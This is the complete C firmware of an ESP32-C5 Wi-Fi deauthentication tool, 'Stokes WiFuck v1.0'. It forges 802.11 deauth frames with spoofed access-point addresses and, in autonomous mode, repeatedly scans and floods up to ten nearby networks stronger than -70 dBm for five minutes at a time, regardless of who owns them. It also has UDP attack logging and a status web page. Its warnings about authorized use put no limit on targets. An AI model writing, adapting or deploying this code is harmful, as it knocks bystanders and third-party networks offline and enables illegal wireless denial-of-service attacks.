// main.c - Stokes WiFuck v1.0 - ESP32-C5 Dual-Band Deauther
// Features: Autonomous deauth, UDP logging, no LED, no forced rate (driver default)

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/time.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/queue.h"
#include "esp_log.h"
#include "nvs_flash.h"
#include "esp_timer.h"
#include "esp_event.h"
#include "esp_wifi.h"
#include "esp_netif.h"
#include "esp_system.h"
#include "esp_http_server.h"
#include "cJSON.h"
#include "lwip/sockets.h"
#include "lwip/netdb.h"

static const char *TAG = "WiFuck";

// ==================== CONFIGURATION ====================
#define AUTO_MODE_ENABLED          1
#define BAD_SIGNAL_THRESHOLD       -70        // Attack APs stronger than this
#define MAX_TARGETS                10
#define AUTO_SCAN_INTERVAL_SEC     30
#define AUTO_ATTACK_DURATION_SEC   300

// UDP Logging
#define UDP_LOG_IP                 "192.168.4.20"
#define UDP_LOG_PORT               12345

// Deauth
#define BURST_SIZE                  20         // Frames per target per burst
#define CHANNEL_SWITCH_DELAY_MS     10
#define TARGET_BURST_DELAY_MS       2
// ======================================================

// Target structure
typedef struct {
    uint8_t bssid[6];
    char ssid[33];
    uint8_t channel;
    uint32_t packets_sent;
    bool active;
} attack_target_t;

// Multi-target list
typedef struct {
    attack_target_t targets[MAX_TARGETS];
    uint16_t count;
} target_list_t;

// Global state
static bool attack_running = false;
static target_list_t auto_targets = {0};
static uint32_t attack_duration = 0;
static uint32_t attack_start_time = 0;
static TaskHandle_t attack_task_handle = NULL;
static httpd_handle_t server = NULL;

// Logging queue (for UDP)
static QueueHandle_t log_queue = NULL;
#define LOG_QUEUE_SIZE 20

typedef struct {
    char message[256];
} log_msg_t;

// ==================== Deauth Frame ====================
typedef struct {
    uint8_t frame_ctrl[2];
    uint8_t duration[2];
    uint8_t da[6];
    uint8_t sa[6];
    uint8_t bssid[6];
    uint8_t seq[2];
    uint8_t reason[2];
} __attribute__((packed)) deauth_frame_t;

// ==================== Utility Functions ====================
static uint32_t get_time_sec(void) {
    return (uint32_t)(esp_timer_get_time() / 1000000ULL);
}

// Send a log message to serial and queue for UDP
static void log_to_all(const char *format, ...) {
    char buffer[256];
    va_list args;
    va_start(args, format);
    vsnprintf(buffer, sizeof(buffer), format, args);
    va_end(args);

    // Print to serial
    ESP_LOGI(TAG, "%s", buffer);

    // Queue for UDP (if queue exists)
    if (log_queue) {
        log_msg_t *msg = malloc(sizeof(log_msg_t));
        if (msg) {
            strncpy(msg->message, buffer, sizeof(msg->message) - 1);
            msg->message[sizeof(msg->message) - 1] = '\0';
            if (xQueueSend(log_queue, &msg, 0) != pdTRUE) {
                free(msg); // queue full
            }
        }
    }
}

// ==================== UDP Logging Task ====================
static void udp_logger_task(void *pvParameters) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        ESP_LOGE(TAG, "Failed to create UDP socket");
        vTaskDelete(NULL);
        return;
    }

    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(UDP_LOG_PORT);
    inet_pton(AF_INET, UDP_LOG_IP, &dest_addr.sin_addr);

    log_msg_t *msg;
    while (1) {
        if (xQueueReceive(log_queue, &msg, portMAX_DELAY) == pdTRUE) {
            sendto(sock, msg->message, strlen(msg->message), 0,
                   (struct sockaddr *)&dest_addr, sizeof(dest_addr));
            free(msg);
        }
    }
}

// ==================== Deauth Functions ====================
static inline void send_deauth_frame(uint8_t *ap_mac, uint16_t reason) {
    static uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

    deauth_frame_t frame;
    frame.frame_ctrl[0] = 0xC0;  // type: management, subtype: deauth
    frame.frame_ctrl[1] = 0x00;
    frame.duration[0] = 0x00;
    frame.duration[1] = 0x00;

    memcpy(frame.da, broadcast, 6);
    memcpy(frame.sa, ap_mac, 6);
    memcpy(frame.bssid, ap_mac, 6);

    frame.seq[0] = 0x00;
    frame.seq[1] = 0x00;
    frame.reason[0] = reason & 0xFF;
    frame.reason[1] = (reason >> 8) & 0xFF;

    esp_wifi_80211_tx(WIFI_IF_STA, &frame, sizeof(frame), false);
}

// Attack all targets on a given channel
static void attack_channel(uint8_t channel, target_list_t *list) {
    // Switch to channel
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    vTaskDelay(pdMS_TO_TICKS(CHANNEL_SWITCH_DELAY_MS));

    // Find all targets on this channel
    for (int t = 0; t < list->count; t++) {
        attack_target_t *target = &list->targets[t];
        if (!target->active || target->channel != channel) continue;

        // Send bursts
        static const uint16_t reasons[] = {0x0001, 0x0003, 0x0006, 0x0007, 0x0008};
        for (int i = 0; i < BURST_SIZE; i++) {
            send_deauth_frame(target->bssid, reasons[i % 5]);
            target->packets_sent++;
        }
        vTaskDelay(pdMS_TO_TICKS(TARGET_BURST_DELAY_MS));
    }
}

// ==================== Multi‑Target Attack Task ====================
static void multi_target_attack_task(void *pvParameters) {
    log_to_all("");
    log_to_all("╔════════════════════════════════════════╗");
    log_to_all("║      Stokes WiFuck v1.0 ACTIVE        ║");
    log_to_all("╚════════════════════════════════════════╝");

    log_to_all("🎯 Attacking %d targets:", auto_targets.count);
    for (int i = 0; i < auto_targets.count; i++) {
        attack_target_t *t = &auto_targets.targets[i];
        const char *band = (t->channel <= 14) ? "2.4GHz" : "5GHz";
        log_to_all("   [%d] %s (%s, CH %d)", i, t->ssid, band, t->channel);
    }

    log_to_all("⏱️  Attack duration: %lu seconds", attack_duration);
    log_to_all("🔥 Mode: CHANNEL-OPTIMISED RAPID");
    log_to_all("");

    // Switch to STA only mode
    esp_wifi_set_mode(WIFI_MODE_STA);
    vTaskDelay(pdMS_TO_TICKS(500));

    attack_start_time = get_time_sec();
    uint32_t last_log_time = 0;
    uint32_t cycle_count = 0;

    // Reset counters
    for (int i = 0; i < auto_targets.count; i++) {
        auto_targets.targets[i].packets_sent = 0;
    }

    log_to_all("💥 MULTI-TARGET ATTACK STARTED!");
    log_to_all("");

    // Pre‑compute channel list (unique channels)
    uint8_t channels[14] = {0};
    uint8_t num_channels = 0;
    for (int i = 0; i < auto_targets.count; i++) {
        uint8_t ch = auto_targets.targets[i].channel;
        bool found = false;
        for (int j = 0; j < num_channels; j++) {
            if (channels[j] == ch) { found = true; break; }
        }
        if (!found && num_channels < 14) {
            channels[num_channels++] = ch;
        }
    }

    // MAIN ATTACK LOOP
    while (attack_running) {
        uint32_t elapsed = get_time_sec() - attack_start_time;
        if (elapsed >= attack_duration) {
            log_to_all("⏰ Attack duration expired!");
            break;
        }

        // Attack each channel once per cycle
        for (int c = 0; c < num_channels && attack_running; c++) {
            attack_channel(channels[c], &auto_targets);
        }

        cycle_count++;

        // Log every 2 seconds
        if (elapsed - last_log_time >= 2) {
            last_log_time = elapsed;
            uint32_t remaining = attack_duration - elapsed;

            uint32_t total_packets = 0;
            for (int i = 0; i < auto_targets.count; i++) {
                total_packets += auto_targets.targets[i].packets_sent;
            }
            float total_pps = (float)total_packets / (float)(elapsed > 0 ? elapsed : 1);

            log_to_all("💥 [%2lu/%2lu sec] Total: %6lu pkt | PPS: %4.0f | Targets: %d | Remaining: %2lu sec",
                     elapsed, attack_duration, total_packets, total_pps, auto_targets.count, remaining);

            // Show all targets (up to 5) or top 5 if more
            int show_count = (auto_targets.count <= 5) ? auto_targets.count : 5;
            for (int i = 0; i < show_count; i++) {
                attack_target_t *t = &auto_targets.targets[i];
                float pps = (float)t->packets_sent / (float)(elapsed > 0 ? elapsed : 1);
                const char *band = (t->channel <= 14) ? "2.4G" : "5G";
                log_to_all("   📻 %s: %s - %6lu pkt (%4.0f pps)",
                         band, t->ssid, t->packets_sent, pps);
            }
            log_to_all("");
        }

        // Small delay to prevent CPU starvation
        vTaskDelay(pdMS_TO_TICKS(1));
    }

    log_to_all("");
    log_to_all("╔════════════════════════════════════════╗");
    log_to_all("║         ATTACK COMPLETED               ║");
    log_to_all("╚════════════════════════════════════════╝");

    uint32_t total_time = get_time_sec() - attack_start_time;
    uint32_t total_packets = 0;
    for (int i = 0; i < auto_targets.count; i++) {
        total_packets += auto_targets.targets[i].packets_sent;
    }
    float avg_pps = (float)total_packets / (float)(total_time > 0 ? total_time : 1);

    log_to_all("📊 FINAL STATISTICS:");
    log_to_all("   Total packets: %lu", total_packets);
    log_to_all("   Total time: %lu seconds", total_time);
    log_to_all("   Average PPS: %.0f packets/sec", avg_pps);

    for (int i = 0; i < auto_targets.count; i++) {
        attack_target_t *t = &auto_targets.targets[i];
        float pps = (float)t->packets_sent / (float)total_time;
        const char *band = (t->channel <= 14) ? "2.4GHz" : "5GHz";
        log_to_all("   📻 %s (%s): %lu packets (%.0f pps)", t->ssid, band, t->packets_sent, pps);
    }

    attack_running = false;

    // Restore AP mode
    esp_wifi_set_mode(WIFI_MODE_APSTA);
    wifi_config_t ap_config = {
        .ap = {
            .ssid = "Stokes WiFuck v1.0",
            .ssid_len = strlen("Stokes WiFuck v1.0"),
            .password = "gobyebye",
            .channel = 1,
            .max_connection = 4,
            .authmode = WIFI_AUTH_WPA2_PSK,
            .pmf_cfg = {.required = false},
        },
    };
    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
    esp_wifi_start();

    if (server) {
        log_to_all("✅ Web interface restored at http://192.168.4.1/");
    }

    log_to_all("✅ Ready for next scan cycle. Reconnect to 'Stokes WiFuck v1.0' WiFi.");

    attack_task_handle = NULL;
    vTaskDelete(NULL);
}

static bool start_multi_target_attack(uint32_t duration) {
    if (attack_running) {
        log_to_all("⚠️  Attack already running");
        return false;
    }
    if (auto_targets.count == 0) {
        log_to_all("⚠️  No targets selected");
        return false;
    }
    attack_duration = duration;
    attack_running = true;
    xTaskCreate(multi_target_attack_task, "multi_attack", 8192, NULL, 5, &attack_task_handle);
    return true;
}

// ==================== Scan and Filter ====================
static uint16_t scan_and_filter_targets(void) {
    wifi_scan_config_t scan_config = {
        .ssid = 0,
        .bssid = 0,
        .channel = 0,
        .show_hidden = true
    };

    log_to_all("🔍 Scanning for networks...");
    esp_err_t err = esp_wifi_scan_start(&scan_config, true);
    if (err != ESP_OK) {
        log_to_all("❌ Scan failed: %d", err);
        return 0;
    }

    uint16_t ap_num = 0;
    esp_wifi_scan_get_ap_num(&ap_num);
    log_to_all("✅ Found %d total networks", ap_num);

    wifi_ap_record_t *ap_info = calloc(ap_num, sizeof(wifi_ap_record_t));
    if (!ap_info) return 0;
    esp_wifi_scan_get_ap_records(&ap_num, ap_info);

    auto_targets.count = 0;
    memset(&auto_targets.targets, 0, sizeof(auto_targets.targets));

    log_to_all("🎯 Targeting APs with signal > %d dBm:", BAD_SIGNAL_THRESHOLD);

    for (int i = 0; i < ap_num && auto_targets.count < MAX_TARGETS; i++) {
        if (ap_info[i].rssi > BAD_SIGNAL_THRESHOLD) {
            attack_target_t *t = &auto_targets.targets[auto_targets.count];
            memcpy(t->bssid, ap_info[i].bssid, 6);
            strncpy(t->ssid, (char*)ap_info[i].ssid, sizeof(t->ssid)-1);
            t->ssid[sizeof(t->ssid)-1] = '\0';
            t->channel = ap_info[i].primary;
            t->active = true;
            t->packets_sent = 0;

            const char *band = (ap_info[i].primary <= 14) ? "2.4GHz" : "5GHz";
            log_to_all("  [%d] %s (CH: %d, %s, RSSI: %d, MAC: %02x:%02x:%02x:%02x:%02x:%02x)",
                     auto_targets.count,
                     t->ssid, t->channel, band, ap_info[i].rssi,
                     t->bssid[0], t->bssid[1], t->bssid[2],
                     t->bssid[3], t->bssid[4], t->bssid[5]);

            auto_targets.count++;
        }
    }

    free(ap_info);
    log_to_all("📊 Selected %d targets for attack", auto_targets.count);
    return auto_targets.count;
}

// ==================== Autonomous Mode Task ====================
static void autonomous_mode_task(void *pvParameters) {
    log_to_all("");
    log_to_all("╔════════════════════════════════════════╗");
    log_to_all("║      AUTONOMOUS MODE ACTIVATED        ║");
    log_to_all("╚════════════════════════════════════════╝");
    log_to_all("📊 Signal threshold: > %d dBm", BAD_SIGNAL_THRESHOLD);
    log_to_all("🎯 Max targets: %d", MAX_TARGETS);
    log_to_all("⏱️  Scan interval: %d seconds", AUTO_SCAN_INTERVAL_SEC);
    log_to_all("⚡ Attack duration: %d seconds", AUTO_ATTACK_DURATION_SEC);
    log_to_all("");

    while (1) {
        uint16_t target_count = scan_and_filter_targets();

        if (target_count > 0) {
            log_to_all("⚡ Starting autonomous attack on %d targets", target_count);
            start_multi_target_attack(AUTO_ATTACK_DURATION_SEC);
            while (attack_running) {
                vTaskDelay(pdMS_TO_TICKS(1000));
            }
        } else {
            log_to_all("😴 No strong signals detected, sleeping %d seconds...", AUTO_SCAN_INTERVAL_SEC);
        }

        log_to_all("⏳ Waiting %d seconds before next scan...", AUTO_SCAN_INTERVAL_SEC);
        vTaskDelay(pdMS_TO_TICKS(AUTO_SCAN_INTERVAL_SEC * 1000));
    }
}

// ==================== Web Interface (Status Only) ====================
static char* wifi_scan_get_json(int *out_len) {
    wifi_scan_config_t scan_config = {
        .ssid = 0,
        .bssid = 0,
        .channel = 0,
        .show_hidden = true
    };
    esp_err_t err = esp_wifi_scan_start(&scan_config, true);
    if (err != ESP_OK) {
        *out_len = 0;
        return NULL;
    }

    uint16_t ap_num = 0;
    esp_wifi_scan_get_ap_num(&ap_num);
    wifi_ap_record_t *ap_info = calloc(ap_num, sizeof(wifi_ap_record_t));
    if (!ap_info) {
        *out_len = 0;
        return NULL;
    }
    esp_wifi_scan_get_ap_records(&ap_num, ap_info);

    cJSON *arr = cJSON_CreateArray();
    for (int i = 0; i < ap_num; ++i) {
        cJSON *obj = cJSON_CreateObject();
        cJSON_AddStringToObject(obj, "ssid", (char*)ap_info[i].ssid);
        cJSON_AddNumberToObject(obj, "rssi", ap_info[i].rssi);
        cJSON_AddNumberToObject(obj, "channel", ap_info[i].primary);
        const char *band = (ap_info[i].primary <= 14) ? "2.4GHz" : "5GHz";
        cJSON_AddStringToObject(obj, "band", band);
        char bssid_str[20];
        sprintf(bssid_str, "%02x:%02x:%02x:%02x:%02x:%02x",
                ap_info[i].bssid[0], ap_info[i].bssid[1], ap_info[i].bssid[2],
                ap_info[i].bssid[3], ap_info[i].bssid[4], ap_info[i].bssid[5]);
        cJSON_AddStringToObject(obj, "bssid", bssid_str);
        cJSON_AddItemToArray(arr, obj);
    }

    char *out = cJSON_PrintUnformatted(arr);
    *out_len = strlen(out);
    cJSON_Delete(arr);
    free(ap_info);
    return out;
}

static esp_err_t root_get_handler(httpd_req_t *req) {
    char html[4096];
    int len = snprintf(html, sizeof(html),
        "<!doctype html><html><head><meta charset='utf-8'><title>Stokes WiFuck v1.0</title>"
        "<style>body{font-family:'Segoe UI',Arial;margin:0;padding:20px;background:#1a1a1a;color:#fff}"
        "h2{color:#ff4444;text-shadow:0 0 10px #ff0000;font-size:2.5em}"
        ".container{max-width:1200px;margin:0 auto}.header{text-align:center;margin-bottom:30px}"
        ".subtitle{color:#888;font-style:italic}.info{background:#2196F3;padding:15px;border-radius:8px;margin:20px 0}"
        ".auto-mode{background:#ff4444;color:#fff;padding:15px;border-radius:8px;margin:20px 0;font-weight:bold;text-align:center}"
        ".stats{background:#2a2a2a;padding:15px;border-radius:8px;margin:20px 0;font-family:monospace}"
        ".warning{background:#ffaa00;color:#000;padding:10px;border-radius:8px;margin:20px 0;text-align:center}"
        "</style></head><body><div class='container'>"
        "<div class='header'><h2>🔥 Stokes WiFuck v1.0 🔥</h2>"
        "<div class='subtitle'>Dual-Band Autonomous Deauther</div></div>"
        "<div class='warning'>⚠️ FOR AUTHORIZED TESTING ONLY - UNAUTHORIZED USE IS ILLEGAL</div>"
        "<div class='warning'>⚠️ Networks using 802.11w (PMF) ignore deauth frames. Effectiveness may be limited.</div>"
        "<div class='auto-mode'>🤖 AUTONOMOUS MODE ACTIVE - ATTACKING ALL STRONG SIGNALS</div>"
        "<div class='info'><strong>⚙️ Current Settings:</strong><br>"
        "   • Signal threshold: > %d dBm<br>"
        "   • Max targets: %d<br>"
        "   • Scan interval: %d seconds<br>"
        "   • Attack duration: %d seconds<br></div>"
        "<div class='stats'><strong>📊 Current Status:</strong><br>"
        "   • Attack running: %s<br>"
        "   • Current targets: %d<br></div>"
        "<div class='info'>📡 AP: 'Stokes WiFuck v1.0' | 🔑 Password: 'gobyebye'</div>"
        "<div class='info'>📊 Check Serial Monitor or UDP logs for detailed attack logs</div>"
        "</div></body></html>",
        BAD_SIGNAL_THRESHOLD,
        MAX_TARGETS,
        AUTO_SCAN_INTERVAL_SEC,
        AUTO_ATTACK_DURATION_SEC,
        attack_running ? "YES" : "NO",
        auto_targets.count
    );
    httpd_resp_send(req, html, len);
    return ESP_OK;
}

static esp_err_t scan_get_handler(httpd_req_t *req) {
    int len = 0;
    char *json = wifi_scan_get_json(&len);
    if (!json) {
        httpd_resp_set_status(req, "500 Internal Server Error");
        httpd_resp_sendstr(req, "{\"error\":\"scan failed\"}");
        return ESP_FAIL;
    }
    httpd_resp_set_type(req, "application/json");
    httpd_resp_send(req, json, len);
    free(json);
    return ESP_OK;
}

static httpd_uri_t root_uri = {
    .uri = "/",
    .method = HTTP_GET,
    .handler = root_get_handler,
    .user_ctx = NULL
};

static httpd_uri_t scan_uri = {
    .uri = "/scan",
    .method = HTTP_GET,
    .handler = scan_get_handler,
    .user_ctx = NULL
};

static httpd_handle_t start_webserver(void) {
    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
    config.max_uri_handlers = 8;
    config.lru_purge_enable = true;
    if (httpd_start(&server, &config) == ESP_OK) {
        httpd_register_uri_handler(server, &root_uri);
        httpd_register_uri_handler(server, &scan_uri);
        ESP_LOGI(TAG, "✅ Web server started at http://192.168.4.1/");
    }
    return server;
}

// ==================== Wi-Fi Initialisation ====================
static void wifi_init_ap(void) {
    esp_netif_init();
    esp_event_loop_create_default();
    esp_netif_create_default_wifi_ap();
    esp_netif_create_default_wifi_sta();

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);

    wifi_config_t ap_config = {
        .ap = {
            .ssid = "Stokes WiFuck v1.0",
            .ssid_len = strlen("Stokes WiFuck v1.0"),
            .password = "gobyebye",
            .channel = 1,
            .max_connection = 4,
            .authmode = WIFI_AUTH_WPA2_PSK,
            .pmf_cfg = {.required = false},
        },
    };

    esp_wifi_set_mode(WIFI_MODE_APSTA);
    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
    esp_wifi_start();

    log_to_all("");
    log_to_all("╔════════════════════════════════════════╗");
    log_to_all("║      Stokes_WiFuck_v1                 ║");
    log_to_all("║     Dual-Band Autonomous Deauther     ║");
    log_to_all("╚════════════════════════════════════════╝");
    log_to_all("📡 SSID: Stokes_WiFuck_v1");
    log_to_all("🔑 Password: gobyebye");
    log_to_all("🌐 Web Interface: http://192.168.4.1/");
    log_to_all("⚡ Mode: AUTONOMOUS (threshold > %d dBm)", BAD_SIGNAL_THRESHOLD);
    log_to_all("🎯 Max targets: %d", MAX_TARGETS);
    log_to_all("⏱️  Scan interval: %d seconds", AUTO_SCAN_INTERVAL_SEC);
    log_to_all("⚠️  USE ONLY ON YOUR OWN NETWORKS!");
    log_to_all("");
}

// ==================== Main ====================
void app_main(void) {
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);

    // Initialise Wi-Fi (this starts lwIP)
    wifi_init_ap();

    // Now lwIP is ready, we can create UDP logging
    log_queue = xQueueCreate(LOG_QUEUE_SIZE, sizeof(log_msg_t *));
    xTaskCreate(udp_logger_task, "udp_logger", 4096, NULL, 5, NULL);

    start_webserver();

#if AUTO_MODE_ENABLED
    xTaskCreate(autonomous_mode_task, "auto_mode", 8192, NULL, 5, NULL);
    log_to_all("🤖 Autonomous mode started - will attack all APs with signal > %d dBm", BAD_SIGNAL_THRESHOLD);
#else
    log_to_all("👤 Manual mode - use web interface to select targets");
#endif

    while (1) {
        vTaskDelay(pdMS_TO_TICKS(10000));
    }
}
